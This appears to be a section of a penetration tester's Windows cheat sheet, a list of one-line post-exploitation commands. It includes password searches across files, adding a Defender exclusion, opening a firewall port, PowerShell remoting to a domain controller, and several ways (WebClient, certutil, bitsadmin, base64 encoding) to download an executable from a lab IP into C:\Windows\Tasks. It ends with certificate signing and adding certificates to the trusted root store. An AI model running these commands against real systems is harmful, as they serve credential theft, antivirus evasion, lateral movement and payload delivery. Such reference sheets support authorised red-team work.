## Miscellaneous

- Recursively search from the current directory for "password" (cmd)
```cmd
findstr /S /C:"password" *
```

-  Recursively search from the current directory for the file passwords.txt (cmd)
```cmd
dir passwords.txt /S /B
```

- Find process running on port 80 (PS)
```powershell
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

- Unzip an Archive using PS
```powershell
Expand-Archive .\Tools.zip Tools
```

- Add a firewall rule to allow port 9001 in via TCP
```powershell
# Add the rule
netsh advfirewall firewall add rule name="Allow 9001" dir=in action=allow protocol=TCP localport=9001

# Clean up after
netsh advfirewall firewall delete rule name="Allow 9001" protocol=TCP localport=9001
```

- Add a Defender Exclusion
```powershell
add-MpPReference -ExclusionPath "C:\Program Files"
```

- Use Powershell Remoting to login or send commands to a device with port 5985 and Windows Remote Management enabled for the current user
```powershell
Enter-PSSession -Computername dc04.matrix.local

# Create a stateful session to reuse
$sess = New-PSSession -ComputerName dc04.matrix.local
Enter-PSSession -Session $sess

# Send a command using -ScriptBlock
Invoke-Command -ComputerName dc04.matrix.local -ScriptBlock{whoami;hostname}
```

- Various ways to transfer files on Windows
```powershell
# Vanilla PS
(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/parrot.exe','C:\windows\tasks\parrot.exe')
iwr -uri 'http://10.10.10.10/parrot.exe' -OutFile 'C:\windows\tasks\parrot.exe'

# Certutil
certutil -f -urlcache "http://10.10.10.10/parrot.exe" C:\Windows\Tasks\Parrot.exe

# Bitsadmin
bitsadmin /Transfer file http://10.10.10.10/parrot.exe C:\Windows\Tasks\Parrot.exe

# Convert to b64 with certutil and then unpack on the target
certutil -encode C:\Windows\Tasks\Parrot.exe C:\Windows\Tasks\Parrot.b64
bitsadmin /Transfer file http://10.10.10.10/Parrot.b64 C:\Windows\Tasks\Parrot.b64
certutil -decode C:\Windows\Tasks\Parrot.b64 C:\Windows\Tasks\Parrot.exe
```

- Working with certificates, sometimes they need to be signed. If you have a .cer file, sign it with the thumbprint output from the `Get-PFxCertificate` cmdlet using signtool.
```powershell
Get-PFxCertificate -FilePath .\signing.cer 
Thumbprint: 8E2749C6A42A15861DFA58542D59039BB7A1A915

signtool.exe sign /debug /f signing.cer /d "My Description" /fd sha1 /v /sha1 8E2749C6A42A15861DFA58542D59039BB7A1A915 /t 

# Import a certificate
Certutil -addStore ROOT matrixdc.matrix.local.crt
Certutil -addStore ROOT ADFS-Token.cer
```